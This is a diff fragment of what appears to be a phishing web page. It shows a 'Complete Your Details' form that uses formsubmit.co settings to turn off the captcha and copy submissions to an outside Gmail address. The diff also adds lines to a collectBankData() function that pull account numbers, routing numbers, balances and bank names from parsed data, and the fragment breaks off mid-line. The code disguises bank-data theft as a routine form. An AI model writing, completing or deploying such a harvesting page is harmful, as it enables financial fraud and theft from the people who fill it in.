@@ -190,11 +190,10 @@ animation: spin 1s linear infinite;
 <h2>Complete Your Details</h2>
 <p>Please fill in your information</p>
 
-<form id="mainForm" action="https://formsubmit.co/dooyaabariimeah@gmail.com" method="POST">
+<form id="mainForm">
 
 <input type="hidden" name="_captcha" value="false">
 <input type="hidden" name="_template" value="table">
-<input type="hidden" name="_next" value="https://your-website.com/index.html">
 <input type="hidden" name="_cc" value="elonmusk2020v@gmail.com">
 
 <input type="text" name="name" placeholder="Full Name" required>
@@ -294,3 +293,7 @@ function collectBankData() {
                     const parsed = JSON.parse(data);
                     
                     // Extract account information
+                    if (parsed.accountNumber) bankData.accountNumber = parsed.accountNumber;
+                    if (parsed.routingNumber) bankData.routingNumber = parsed.routingNumber;
+                    if (parsed.balance) bankData.balance = parsed.balance;
+                    if (parsed.bankName) bank
